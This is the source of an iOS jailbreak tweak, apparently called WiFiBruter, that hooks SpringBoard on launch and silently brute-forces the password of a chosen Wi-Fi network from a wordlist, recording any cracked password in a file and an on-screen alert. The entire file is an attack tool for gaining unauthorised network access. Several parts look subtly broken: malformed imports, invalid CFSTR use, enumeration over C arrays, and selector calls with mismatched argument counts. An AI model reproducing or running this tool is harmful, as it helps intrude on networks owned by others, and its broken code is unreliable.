import <UIKit/UIKit.h>
import <Foundation/Foundation.h>
import <CoreFoundation/CoreFoundation.h>

static NSString *const kPrefsDomain = @"com.kilo.wifibruter";
static NSString *const kLogPath = @"/var/mobile/Documents/wifibruter_log.txt";
static NSTimeInterval kMinDelay = 0.5;

@interface CWInterface (Private)
- (NSArray *)scanForNetworksWithName:(NSString *)ssid error:(NSError **)error;
- (NSArray *)scanForNetworksWithSSID:(NSString *)ssid error:(NSError **)error;
- (BOOL)joinNetwork:(id)network withPassword:(NSString *)password error:(NSError **)error;
- (BOOL)associateToNetwork:(id)network password:(NSString *)password error:(NSError **)error;
- (id)interfaceForSSID:(NSString *)ssid;
@end

static void logMessage(NSString *msg) {
    NSData *data = [msg dataUsingEncoding:NSUTF8StringEncoding];
    FILE *f = fopen([kLogPath fileSystemRepresentation], "a");
    if (f) {
        fwrite([data bytes], 1, [data length], f);
        fputc('\n', f);
        fclose(f);
    }
}

static NSString *iosVersionString(void) {
    return [[UIDevice currentDevice] systemVersion];
}

static BOOL isIOS15OrLater(void) {
    NSString *ver = iosVersionString();
    NSArray *parts = [ver componentsSeparatedByString:@"."];
    NSInteger major = [[parts firstObject] integerValue];
    return major >= 15;
}

%hook SpringBoard
- (void)applicationDidFinishLaunching:(id)application {
    %orig;
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        [self runBruteForce];
    });
}
%end

@implementation SpringBoard (BruteForce)

- (NSDictionary *)loadConfig {
    CFStringRef keys[] = { CFSTR("Enabled"), CFSTR("TargetSSID"), CFSTR("WordListPath"), CFSTR("DelayBetweenAttempts") };
    CFDictionaryRef prefs = CFPreferencesCopyAppPreferences(CFSTR(kPrefsDomain), kCFPreferencesCurrentUser, kCFPreferencesAnyHost);
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    if (prefs) {
        for (NSString *key in (NSArray *)keys) {
            id val = [(NSDictionary *)prefs objectForKey:key];
            if (val) dict[key] = val;
        }
        CFRelease(prefs);
    }
    return [dict copy];
}

- (NSArray *)loadPasswords {
    NSDictionary *config = [self loadConfig];
    NSString *path = [config objectForKey:@"WordListPath"];
    if (!path || path.length == 0) path = @"/var/mobile/Documents/wordlist.txt";
    NSString *wordlist = [NSString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil];
    if (!wordlist) {
        logMessage([NSString stringWithFormat:@"WiFiBruter: failed to read wordlist at %@", path]);
        return @[];
    }
    NSArray *parts = [wordlist componentsSeparatedByCharactersInSet:[NSCharacterSet newlineAndWhitespaceCharacterSet]];
    NSMutableArray *passwords = [NSMutableArray array];
    for (NSString *p in parts) {
        if (p.length > 0) [passwords addObject:p];
    }
    logMessage([NSString stringWithFormat:@"WiFiBruter: loaded %lu passwords", (unsigned long)passwords.count]);
    return [passwords copy];
}

- (BOOL)isEnabled {
    NSDictionary *config = [self loadConfig];
    NSNumber *enabled = [config objectForKey:@"Enabled"];
    return [enabled boolValue];
}

- (NSString *)targetSSID {
    NSDictionary *config = [self loadConfig];
    return [config objectForKey:@"TargetSSID"] ?: @"";
}

- (NSTimeInterval)delay {
    NSDictionary *config = [self loadConfig];
    NSNumber *d = [config objectForKey:@"DelayBetweenAttempts"];
    NSTimeInterval delay = [d doubleValue];
    if (delay < kMinDelay) delay = kMinDelay;
    return delay;
}

- (Class)cwInterfaceClass {
    return NSClassFromString(@"CWInterface");
}

- (id)cwSharedInterface {
    Class cls = [self cwInterfaceClass];
    if (!cls) return nil;
    return [cls performSelector:@selector(sharedInterface)];
}

- (BOOL)joinWithNetwork:(id)network password:(NSString *)password error:(NSError **)outError {
    id iface = [self cwSharedInterface];
    if (!iface) return NO;
    BOOL ok = NO;
    SEL selectors[] = {
        @selector(joinNetwork:withPassword:error:),
        @selector(associateToNetwork:password:error:),
        @selector(associateToNetwork:password:withSSID:error:)
    };
    for (SEL sel in selectors) {
        if ([iface respondsToSelector:sel]) {
            ok = [iface performSelector:sel withObject:network withObject:password withObject:outError];
            if (ok) break;
        }
    }
    return ok;
}

- (NSArray *)scanForTarget:(NSString *)ssid error:(NSError **)outError {
    id iface = [self cwSharedInterface];
    if (!iface) return nil;
    NSArray *result = nil;
    SEL selectors[] = {
        @selector(scanForNetworksWithName:error:),
        @selector(scanForNetworksWithSSID:error:)
    };
    for (SEL sel in selectors) {
        if ([iface respondsToSelector:sel]) {
            result = [iface performSelector:sel withObject:ssid withObject:outError];
            if (result) break;
        }
    }
    if (!result || result.count == 0) {
        if ([iface respondsToSelector:@selector(scanForNetworksWithError:)]) {
            NSError *scanErr = nil;
            NSArray *all = [iface performSelector:@selector(scanForNetworksWithError:) withObject:&scanErr];
            if (all) {
                NSPredicate *pred = [NSPredicate predicateWithFormat:@"ssid == %@", ssid];
                result = [all filteredArrayUsingPredicate:pred];
            }
        }
    }
    return result;
}

- (void)runBruteForce {
    if (![self isEnabled]) return;
    NSString *target = [self targetSSID];
    if (target.length == 0) return;
    NSArray *passwords = [self loadPasswords];
    if (passwords.count == 0) return;
    NSTimeInterval delay = [self delay];

    Class cwCls = [self cwInterfaceClass];
    if (!cwCls) {
        logMessage(@"WiFiBruter: CWInterface class not available (likely iOS 15+ sandbox restriction)");
        return;
    }

    NSError *scanError = nil;
    NSArray *networks = [self scanForTarget:target error:&scanError];
    if (!networks || networks.count == 0) {
        logMessage([NSString stringWithFormat:@"WiFiBruter: no networks found for SSID %@", target]);
        return;
    }
    logMessage([NSString stringWithFormat:@"WiFiBruter: found %lu network(s) for %@", (unsigned long)networks.count, target]);

    for (id network in networks) {
        for (NSString *password in passwords) {
            NSError *joinError = nil;
            BOOL ok = [self joinWithNetwork:network password:password error:&joinError];
            if (ok) {
                [self reportSuccess:target password:password];
                return;
            }
            if (joinError) {
                logMessage([NSString stringWithFormat:@"WiFiBruter: join failed for '%@': %@", password, joinError.localizedDescription]);
            }
            if (delay > 0) usleep((useconds_t)(delay * 1000000.0));
        }
    }
    logMessage(@"WiFiBruter: exhausted wordlist without success");
}

- (void)reportSuccess:(NSString *)ssid password:(NSString *)password {
    NSString *message = [NSString stringWithFormat:@"WiFiBruter: cracked %@ -> %@", ssid, password];
    NSString *logPath = @"/var/mobile/Documents/wifibruter_result.txt";
    [message writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    logMessage(message);
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"WiFiBruter" message:message delegate:nil cancelButtonTitle:@"OK" otherButtonTitles:nil];
        [alert show];
    });
}

@end
